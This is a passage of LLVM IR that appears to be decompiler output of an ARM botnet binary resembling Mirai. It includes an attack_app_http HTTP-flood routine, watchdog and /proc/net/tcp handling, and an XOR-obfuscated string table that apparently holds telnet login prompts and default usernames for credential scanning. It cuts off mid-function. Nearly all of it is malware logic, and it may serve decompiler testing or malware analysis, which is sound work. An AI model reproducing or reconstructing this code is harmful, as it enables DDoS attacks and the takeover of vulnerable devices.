source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_240f4.23 = global i32 0
@global_var_ecac.27 = constant i32 -382906384
@global_var_1b3e8.30 = constant [4 x i8] c"GET\00"
@global_var_1b3ec.32 = constant i32 47
@global_var_16390.35 = constant i32 -450904024
@global_var_1b3e0.37 = constant i32 32
@global_var_1b3b8.39 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_1b3d0.41 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_1b3dc.43 = constant [3 x i8] c"\0D\0A\00"
@global_var_1b3f0.45 = constant [9 x i8] c"Cookie: \00"
@global_var_1b3fc.47 = constant [3 x i8] c"; \00"
@global_var_1b408.49 = constant i32 59
@global_var_1b400.51 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_1b40c.53 = constant [5 x i8] c"http\00"
@global_var_1b414.55 = constant [5 x i8] c"url=\00"
@global_var_1b41c.57 = constant [5 x i8] c"POST\00"
@global_var_1b424.59 = constant i32 39
@global_var_122cc.60 = constant i32 -439279616
@global_var_1b428.62 = constant i32 61
@global_var_24318.66 = global i32 0
@global_var_a0ac.67 = constant i32 -352321547
@global_var_14eb8.68 = constant i32 -382909968
@global_var_2431c.70 = global i32 0
@global_var_24320.71 = local_unnamed_addr global i32 0
@global_var_24324.72 = local_unnamed_addr global i32 0
@global_var_24328.73 = local_unnamed_addr global i32 0
@global_var_2432c.74 = local_unnamed_addr global i32 0
@global_var_24330.75 = local_unnamed_addr global i32 0
@global_var_24334.76 = local_unnamed_addr global i32 0
@global_var_24338.77 = local_unnamed_addr global i32 0
@global_var_d1e4.83 = constant i32 -382906384
@global_var_d61c.85 = constant i32 -382906384
@global_var_ca58.87 = constant i32 -382906384
@global_var_c3ac.89 = constant i32 -382906384
@global_var_bcb4.91 = constant i32 -382906384
@global_var_b500.93 = constant i32 -382906384
@global_var_aee4.95 = constant i32 -382906384
@global_var_a850.97 = constant i32 -382906384
@global_var_81d0.99 = constant i32 -382906384
@global_var_26e50.101 = global i32 0
@global_var_26e58.112 = global i32 0
@global_var_1b42c.114 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_2433c.118 = global i32 0
@global_var_26e54.120 = global i32 0
@global_var_12db8.122 = constant i32 -382910336
@global_var_ec28.124 = constant i32 -382910352
@global_var_241a8.126 = global i32 75104
@global_var_241a0.128 = global i32 -1
@global_var_26e60.134 = local_unnamed_addr global i32 0
@global_var_26e5e.135 = local_unnamed_addr global i32 0
@global_var_1b43c.138 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_1b460.145 = constant i32 10
@global_var_1b44c.147 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_241a4.149 = global i32 -1
@global_var_12560.155 = constant i32 -382910352
@global_var_1b464.158 = constant i32 16777216
@global_var_24344.160 = global i32 0
@global_var_24350.162 = global i32 0
@global_var_24348.164 = global i32 0
@global_var_2434c.166 = global i32 0
@global_var_1b46c.172 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_fbac.182 = constant i32 -509607925
@global_var_26e74.184 = global i32 0
@global_var_24388.186 = global i32 0
@global_var_24354.188 = global i32 0
@global_var_24380.190 = global i32 0
@global_var_26e6c.197 = global i32 0
@global_var_26e70.199 = global i32 0
@global_var_2435a.202 = local_unnamed_addr global i32 0
@global_var_24360.206 = local_unnamed_addr global i32 0
@global_var_2435c.207 = local_unnamed_addr global i32 0
@global_var_24361.208 = local_unnamed_addr global i32 0
@global_var_2437a.211 = local_unnamed_addr global i32 0
@global_var_1b498.213 = constant i32 5396247
@global_var_1b490.215 = constant [5 x i8] c"PMMV\00"
@global_var_1b49c.217 = constant i32 1296912387
@global_var_1b514.219 = constant i32 19
@global_var_1b4a4.221 = constant i32 320017171
@global_var_1b4ac.223 = constant i32 4115
@global_var_1b4b0.225 = constant i32 370216979
@global_var_1b4b8.227 = constant i32 370216979
@global_var_1b4c0.229 = constant i32 370216979
@global_var_1b4c8.231 = constant [7 x i8] c"CLVQNS\00"
@global_var_1b4d0.233 = constant i32 370216979
@global_var_1b4dc.235 = constant i32 370216979
@global_var_1b4e8.237 = constant i32 303174162
@global_var_1b4f0.239 = constant i32 303174162
@global_var_1b4fc.241 = constant i32 370216979
@global_var_1b508.243 = constant [8 x i8] c"FGDCWNV\00"
@global_var_10ec8.244 = constant i32 111888
@global_var_1b510.245 = constant i32 269555223
@global_var_1b518.247 = constant [7 x i8] c"XNZZ\0C\22\00"
@global_var_1b520.249 = constant [6 x i8] c"HT@XF\00"
@global_var_1b528.251 = constant [5 x i8] c"CLIM\00"
@global_var_1b530.253 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_1b538.255 = constant i32 387006810
@global_var_1b540.257 = constant [6 x i8] c"TKXZT\00"
@global_var_1b548.259 = constant [6 x i8] c"CFOKL\00"
@global_var_1b550.261 = constant [5 x i8] c"RCQQ\00"
@global_var_1b558.263 = constant [8 x i8] c"CLVQNS\22\00"
@global_var_1b560.265 = constant i32 320499557
@global_var_1b568.267 = constant i32 437918234
@global_var_1b570.269 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_1b57c.271 = constant i32 319951379
@global_var_1b588.273 = constant i32 1447843658
@global_var_1b594.275 = constant i32 1867011861
@global_var_1b5a4.277 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_1b5b0.279 = constant i32 1178819416
@global_var_1b5bc.281 = constant i32 320017171
@global_var_1b5c4.283 = constant i32 269488144
@global_var_1b5cc.285 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_1b404.287 = constant i32 0
@global_var_1b5dc.289 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_1b5ec.291 = constant [6 x i8] c"cFOKL\00"
@global_var_1b5f4.293 = constant [4 x i8] c"CFO\00"
@global_var_1b5f8.295 = constant [9 x i8] c"QOACFOKL\00"
@global_var_1b604.297 = constant i32 1263486531
@global_var_1b610.299 = constant i32 1263486531
@global_var_1b61c.301 = constant i32 323043395
@global_var_1b624.303 = constant i32 324420417
@global_var_1b630.305 = constant i32 387007823
@global_var_1b638.307 = constant [7 x i8] c"OGPNKL\00"
@global_var_1b640.309 = constant [8 x i8] c"QWRRMPV\00"
@global_var_1b648.311 = constant [5 x i8] c"WQGP\00"
@global_var_1b650.313 = constant [6 x i8] c"EWGQV\00"
@global_var_1b658.315 = constant [7 x i8] c"FCGOML\00"
@global_var_1b660.317 = constant [4 x i8] c"@KL\00"
@global_var_1b664.319 = constant [7 x i8] c"VGNLGV\00"
@global_var_1b66c.321 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_24364.322 = local_unnamed_addr global i32 0
@global_var_24362.323 = local_unnamed_addr global i32 0
@global_var_24368.324 = local_unnamed_addr global i32 0
@global_var_24370.326 = local_unnamed_addr global i32 0
@global_var_2437c.327 = local_unnamed_addr global i32 0
@global_var_fcbc.329 = constant i32 -382910352
@global_var_1b680.332 = constant [5 x i8] c"ogin\00"
@global_var_1b688.334 = constant [8 x i8] c"assword\00"
@global_var_1b699.336 = constant i32 1092615167
@global_var_1b690.338 = constant i32 2095871
@global_var_1b678.343 = constant [6 x i8] c"enter\00"
@global_var_26e7c.345 = global i32 0
@global_var_241b0.348 = global i32 -559038737
@global_var_1b69c.353 = constant [21 x i8] c"ALA\0CJCAIWP@MVLGV\0CAD\22\00"
@global_var_26e94.354 = local_unnamed_addr global i32 0
@global_var_26e98.355 = local_unnamed_addr global i32 0
@global_var_1b6b4.357 = constant [3 x i8] c"\22]\00"
@global_var_26e9c.358 = local_unnamed_addr global i32 0
@global_var_26ea0.359 = local_unnamed_addr global i32 0
@global_var_1b6b8.361 = constant [24 x i8] c"PGRMPV\0CJCAIWP@MVLGV\0CAD\22\00"
@global_var_26f10.362 = local_unnamed_addr global i32 0
@global_var_26f0c.363 = local_unnamed_addr global i32 0
@global_var_1b6d0.365 = constant i32 51097
@global_var_26f14.366 = local_unnamed_addr global i32 0
@global_var_26f18.367 = local_unnamed_addr global i32 0
@global_var_1b6d4.369 = constant i32 1448168270
@global_var_26e8c.370 = local_unnamed_addr global i32 0
@global_var_26e90.371 = local_unnamed_addr global i32 0
@global_var_1b6e4.373 = constant i32 1381389898
@global_var_26ea8.374 = local_unnamed_addr global i32 0
@global_var_26ea4.375 = local_unnamed_addr global i32 0
@global_var_1b704.377 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_26eac.378 = local_unnamed_addr global i32 0
@global_var_26eb0.379 = local_unnamed_addr global i32 0
@global_var_1b70c.381 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_26eb4.382 = local_unnamed_addr global i32 0
@global_var_26eb8.383 = local_unnamed_addr global i32 0
@global_var_1b714.385 = constant i32 1195772418
@global_var_26ebc.386 = local_unnamed_addr global i32 0
@global_var_26ec0.387 = local_unnamed_addr global i32 0
@global_var_1b720.389 = constant [5 x i8] c"\0DDF\22\00"
@global_var_26ec8.390 = local_unnamed_addr global i32 0
@global_var_26ec4.391 = local_unnamed_addr global i32 0
@global_var_1b728.393 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_26ecc.394 = local_unnamed_addr global i32 0
@global_var_26ed0.395 = local_unnamed_addr global i32 0
@global_var_1b730.397 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_26ed4.398 = local_unnamed_addr global i32 0
@global_var_26ed8.399 = local_unnamed_addr global i32 0
@global_var_1b73c.401 = constant i32 1836214128
@global_var_26edc.402 = local_unnamed_addr global i32 0
@global_var_26ee0.403 = local_unnamed_addr global i32 0
@global_var_1b74c.405 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_26ee4.406 = local_unnamed_addr global i32 0
@global_var_26ee8.407 = local_unnamed_addr global i32 0
@global_var_1b758.409 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_26eec.410 = local_unnamed_addr global i32 0
@global_var_26ef0.411 = local_unnamed_addr global i32 0
@global_var_1b764.413 = constant i32 437738110
@global_var_26ef8.414 = local_unnamed_addr global i32 0
@global_var_26ef4.415 = local_unnamed_addr global i32 0
@global_var_1b788.417 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_26efc.418 = local_unnamed_addr global i32 0
@global_var_26f00.419 = local_unnamed_addr global i32 0
@global_var_1b794.421 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_26f04.422 = local_unnamed_addr global i32 0
@global_var_26f08.423 = local_unnamed_addr global i32 0
@global_var_1b7a0.425 = constant [7 x i8] c"QJGNN\22\00"
@global_var_26f1c.426 = local_unnamed_addr global i32 0
@global_var_26f20.427 = local_unnamed_addr global i32 0
@global_var_1b7a8.429 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_26f24.430 = local_unnamed_addr global i32 0
@global_var_26f28.431 = local_unnamed_addr global i32 0
@global_var_1b7b0.433 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_26f2c.434 = local_unnamed_addr global i32 0
@global_var_26f30.435 = local_unnamed_addr global i32 0
@global_var_1b7b8.437 = constant [4 x i8] c"QJ\22\00"
@global_var_26f38.438 = local_unnamed_addr global i32 0
@global_var_26f34.439 = local_unnamed_addr global i32 0
@global_var_1b7bc.441 = constant i32 1280000013
@global_var_26f3c.442 = local_unnamed_addr global i32 0
@global_var_26f40.443 = local_unnamed_addr global i32 0
@global_var_1b7d0.445 = constant i32 1668311919
@global_var_26f48.446 = local_unnamed_addr global i32 0
@global_var_26f44.447 = local_unnamed_addr global i32 0
@global_var_1b7ec.449 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_26f4c.450 = local_unnamed_addr global i32 0
@global_var_26f50.451 = local_unnamed_addr global i32 0
@global_var_1b7f8.453 = constant i32 1280000013
@global_var_26f54.454 = local_unnamed_addr global i32 0
@global_var_26f58.455 = local_unnamed_addr global i32 0
@global_var_1b80c.457 = constant i32 1280000013
@global_var_26f5c.458 = local_unnamed_addr global i32 0
@global_var_26f60.459 = local_unnamed_addr global i32 0
@global_var_1b824.461 = constant i32 1464693110
@global_var_26f68.462 = local_unnamed_addr global i32 0
@global_var_26f64.463 = local_unnamed_addr global i32 0
@global_var_1b83c.465 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_26f6c.466 = local_unnamed_addr global i32 0
@global_var_26f70.467 = local_unnamed_addr global i32 0
@global_var_1b850.469 = constant i32 1196376908
@global_var_26f74.470 = local_unnamed_addr global i32 0
@global_var_26f78.471 = local_unnamed_addr global i32 0
@global_var_1b860.473 = constant i32 1280068961
@global_var_26f7c.474 = local_unnamed_addr global i32 0
@global_var_1b878.476 = constant i32 1195458915
@global_var_26f84.477 = local_unnamed_addr global i32 0
@global_var_1b8cc.479 = constant i32 1195458915
@global_var_26f8c.480 = local_unnamed_addr global i32 0
@global_var_1b8f0.482 = constant i32 1447841121
@global_var_26f94.483 = local_unnamed_addr global i32 0
@global_var_1b924.485 = constant i32 1633044305
@global_var_26f9c.486 = local_unnamed_addr global i32 0
@global_var_1b934.488 = constant i32 1346651984
@global_var_26fa4.489 = local_unnamed_addr global i32 0
@global_var_1b940.491 = constant i32 1128353102
@global_var_26fac.492 = local_unnamed_addr global i32 0
@global_var_1b94c.494 = constant i32 257312593
@global_var_26fb4.495 = local_unnamed_addr global i32 0
@global_var_1b95c.497 = constant i32 1447841089
@global_var_26fbc.498 = local_unnamed_addr global i32 0
@global_var_1b970.500 = constant i32 1279479894
@global_var_26fc4.501 = local_unnamed_addr global i32 0
@global_var_1b984.503 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_26fcc.504 = local_unnamed_addr global i32 0
@global_var_1b86c.506 = constant i32 1380403017
@global_var_26fd4.507 = local_unnamed_addr global i32 0
@global_var_1b990.509 = constant i32 1280068929
@global_var_26fdc.510 = local_unnamed_addr global i32 0
@global_var_1b9a0.512 = constant i32 1414547281
@global_var_26fe4.513 = local_unnamed_addr global i32 0
@global_var_1b9b4.515 = constant i32 1414547281
@global_var_26fec.516 = local_unnamed_addr global i32 0
@global_var_1b9d0.518 = constant i32 1264078191
@global_var_26ff4.519 = local_unnamed_addr global i32 0
@global_var_1ba40.521 = constant i32 1264078191
@global_var_26ffc.522 = local_unnamed_addr global i32 0
@global_var_1bab0.524 = constant i32 1264078191
@global_var_27004.525 = local_unnamed_addr global i32 0
@global_var_1bb20.527 = constant i32 1264078191
@global_var_2700c.528 = local_unnamed_addr global i32 0
@global_var_1bb90.530 = constant i32 1264078191
@global_var_27014.531 = local_unnamed_addr global i32 0
@global_var_240f8.537 = global i32 0
@global_var_11544.539 = constant [3 x i8] c"=\09\00"
@global_var_11330.549 = constant i32 -905969543
@global_var_112ac.552 = constant i32 -481099714
@global_var_13110.566 = constant i32 -443088884
@global_var_10e54.573 = constant i32 167772249
@global_var_10dc0.576 = constant i32 -481165250
@global_var_135ac.584 = constant i32 -456978431
@global_var_1066c.614 = constant i32 -481230837
@global_var_13e78.630 = constant i32 -478871519
@global_var_1491c.647 = constant i32 -478805983
@global_var_f81c.649 = constant i32 -509607927
@global_var_14d04.658 = constant i32 -382906384
@global_var_16e10.667 = constant i32 -442544040
@global_var_1569c.691 = constant i32 -369098502
@global_var_16070.705 = constant i32 -382910288
@global_var_16220.717 = constant i32 -2020859901
@global_var_1630c.720 = constant i32 -494075872
@global_var_12f7c.721 = constant i32 -382910336
@global_var_273a4.724 = local_unnamed_addr global i32 0
@global_var_daa4.730 = constant i32 -637534195
@global_var_15134.740 = constant i32 -442543860
@global_var_13510.748 = constant i32 -369093154
@global_var_17308.774 = constant i32 -382910352
@global_var_d048.782 = constant i32 -442695636
@global_var_18718.797 = constant i32 -382906384
@global_var_181d8.825 = constant i32 -382910448
@global_var_19bc8.826 = constant i32 -382909968
@global_var_1a304.887 = constant i32 -481296376
@global_var_1a3fc.888 = constant i32 -481296376
@global_var_1a480.889 = constant i32 -369098732
@global_var_242f8.13 = external global i8*
@global_var_24314.64 = external global i8*
@global_var_24315.81 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_241ac.130 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_26e5c.133 = global i16* null
@global_var_24340.152 = external global i8*
@global_var_24384.192 = global i16* null
@global_var_24358.201 = external global i8*
@global_var_2436c.204 = global i16 0
@global_var_24378.205 = local_unnamed_addr global i8 0
@global_var_2436e.209 = local_unnamed_addr global i16 0
@global_var_24379.210 = local_unnamed_addr global i8 0
@global_var_24150.533 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_242f8.13 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_242f8.13 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_242f8.13, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_240f4.23, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_240f4.23 to i32)

; uselistorder directives
  uselistorder i32* @global_var_240f4.23, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_ecac.27 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 111512, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_app_http(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-10572 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-20813 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v18_81d0 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_81fc = inttoptr i32 %arg4 to i32*
  %v6_81fc = call i32 @attack_get_opt_str(i32 %arg3, i32* %v5_81fc, i32 21, i32 0, i32 %arg2)
  %v0_8200 = load i32, i32* @r5, align 4
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_820c = load i32, i32* @r4, align 4
  store i32 %v0_820c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b3e8.30 to i32), i32* %r3.global-to-local, align 4
  %v6_8214 = inttoptr i32 %v0_8200 to i32*
  %v7_8214 = call i32 @attack_get_opt_str(i32 %v0_820c, i32* %v6_8214, i32 20, i32 ptrtoint ([4 x i8]* @global_var_1b3e8.30 to i32), i32 %v6_81fc)
  %v0_8218 = load i32, i32* @r5, align 4
  store i32 %v0_8218, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8214, i32* @sb, align 4
  %v0_8228 = load i32, i32* @r4, align 4
  store i32 %v0_8228, i32* %r0.global-to-local, align 4
  %v5_822c = inttoptr i32 %v0_8218 to i32*
  %v6_822c = call i32 @attack_get_opt_str(i32 %v0_8228, i32* %v5_822c, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8230 = load i32, i32* @r5, align 4
  store i32 %v0_8230, i32* %r1.global-to-local, align 4
  store i32 %v6_822c, i32* @sl, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_823c = load i32, i32* @r4, align 4
  store i32 %v0_823c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3ec.32 to i32), i32* %r3.global-to-local, align 4
  %v5_8244 = inttoptr i32 %v0_8230 to i32*
  %v6_8244 = call i32 @attack_get_opt_str(i32 %v0_823c, i32* %v5_8244, i32 22, i32 ptrtoint (i32* @global_var_1b3ec.32 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8248 = load i32, i32* @r5, align 4
  store i32 %v0_8248, i32* %r1.global-to-local, align 4
  store i32 %v6_8244, i32* @r8, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8254 = load i32, i32* @r4, align 4
  store i32 %v0_8254, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_825c = inttoptr i32 %v0_8248 to i32*
  %v5_825c = call i32 @attack_get_opt_int(i32 %v0_8254, i32* %v4_825c, i32 24, i32 1)
  %v0_8260 = load i32, i32* @r5, align 4
  store i32 %v0_8260, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_825c, i32* @r6, align 4
  %v0_8270 = load i32, i32* @r4, align 4
  store i32 %v0_8270, i32* %r0.global-to-local, align 4
  %v4_8274 = inttoptr i32 %v0_8260 to i32*
  %v5_8274 = call i32 @attack_get_opt_int(i32 %v0_8270, i32* %v4_8274, i32 7, i32 80)
  %v2_827c = ptrtoint i32* %stack_var_-20813 to i32
  %v3_8284 = mul i32 %v5_8274, 65536
  store i32 %v3_8284, i32* %r3.global-to-local, align 4
  %tmp168 = bitcast i32* %stack_var_-20813 to i8*
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8298 = urem i32 %v5_8274, 65536
  store i32 %v3_8298, i32* @r7, align 4
  %v4_829c = call i32 @__GI_memset(i8* %tmp168, i32 0, i32 10241)
  store i32 %v4_829c, i32* %r0.global-to-local, align 4
  %v0_82a0 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_82a0 = icmp eq i32 %v0_82a0, 0
  store i1 %v2_82a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_82a0, label %.thread14, label %bb

bb:                                               ; preds = %entry
  %v1_82a4 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_82a4 = icmp eq i32 %v1_82a4, 0
  store i1 %v3_82a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_82a4, label %bb169, label %dec_label_pc_82c4

.thread14:                                        ; preds = %entry
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

bb169:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

dec_label_pc_82b4:                                ; preds = %bb169, %dec_label_pc_82e4, %.thread14, %dec_label_pc_82d4, %dec_label_pc_82c4
  %v1_82c0 = phi i32 [ %v2_82e8, %dec_label_pc_82e4 ], [ %v4_829c, %.thread14 ], [ %v4_829c, %bb169 ], [ %v2_82d8, %dec_label_pc_82d4 ], [ %v2_82c8, %dec_label_pc_82c4 ]
  store i32 %v3_81d0, i32* %r4.global-to-local, align 4
  store i32 %v18_81d0, i32* %sb.global-to-local, align 4
  ret i32 %v1_82c0

dec_label_pc_82c4:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_82a0, i32* %r0.global-to-local, align 4
  %v1_82c8 = inttoptr i32 %v0_82a0 to i8*
  %v2_82c8 = call i32 @util_strlen(i8* %v1_82c8)
  store i32 %v2_82c8, i32* %r0.global-to-local, align 4
  %v2_82cc = icmp ugt i32 %v2_82c8, 254
  store i1 %v2_82cc, i1* %cpsr_c.global-to-local, align 1
  %v7_82cc = icmp eq i32 %v2_82c8, 255
  store i1 %v7_82cc, i1* %cpsr_z.global-to-local, align 1
  %v8_82d0 = icmp sgt i32 %v2_82c8, 255
  br i1 %v8_82d0, label %dec_label_pc_82b4, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82c4
  %v0_82d4 = load i32, i32* @sl, align 4
  store i32 %v0_82d4, i32* %r0.global-to-local, align 4
  %v1_82d8 = inttoptr i32 %v0_82d4 to i8*
  %v2_82d8 = call i32 @util_strlen(i8* %v1_82d8)
  store i32 %v2_82d8, i32* %r0.global-to-local, align 4
  %v2_82dc = icmp ugt i32 %v2_82d8, 126
  store i1 %v2_82dc, i1* %cpsr_c.global-to-local, align 1
  %v7_82dc = icmp eq i32 %v2_82d8, 127
  store i1 %v7_82dc, i1* %cpsr_z.global-to-local, align 1
  %v8_82e0 = icmp sgt i32 %v2_82d8, 127
  br i1 %v8_82e0, label %dec_label_pc_82b4, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d4
  %v0_82e4 = load i32, i32* @sb, align 4
  store i32 %v0_82e4, i32* %r0.global-to-local, align 4
  %v1_82e8 = inttoptr i32 %v0_82e4 to i8*
  %v2_82e8 = call i32 @util_strlen(i8* %v1_82e8)
  store i32 %v2_82e8, i32* %r0.global-to-local, align 4
  %v2_82ec = icmp ugt i32 %v2_82e8, 8
  store i1 %v2_82ec, i1* %cpsr_c.global-to-local, align 1
  %v7_82ec = icmp eq i32 %v2_82e8, 9
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  %v7_82f0 = icmp sgt i32 %v2_82e8, 9
  br i1 %v7_82f0, label %dec_label_pc_82b4, label %bb170

bb170:                                            ; preds = %dec_label_pc_82e4
  %v10_82f0 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v8_82f4 = load i32, i32* @r4, align 4
  %v10_82f4 = add i32 %v10_82f0, 364
  %v11_82f4 = inttoptr i32 %v10_82f4 to i32*
  store i32 %v8_82f4, i32* %v11_82f4, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %bb170, %bb174
  %v0_82fc = load i32, i32* @sb, align 4
